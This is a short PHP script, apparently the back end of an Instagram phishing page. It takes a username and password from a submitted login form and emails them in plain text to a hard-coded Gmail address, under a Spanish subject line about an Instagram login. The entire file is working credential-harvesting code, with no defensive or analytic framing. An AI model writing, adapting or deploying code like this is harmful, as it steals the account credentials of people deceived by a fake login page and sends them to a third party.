<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $to = "luigiialexismarquez019@gmail.com";
    $subject = "Inicio de sesión en Instagram";
    $message = "Nombre de usuario: $username\nContraseña: $password";
    $headers = "From: luigiialexismarquez019@gmail.com"; // Cambiar por tu dirección de correo

    if (mail($to, $subject, $message, $headers)) {
        echo "¡Correo enviado con éxito!";
    } else {
        echo "¡Hubo un error al enviar el correo!";
    }
}
?>
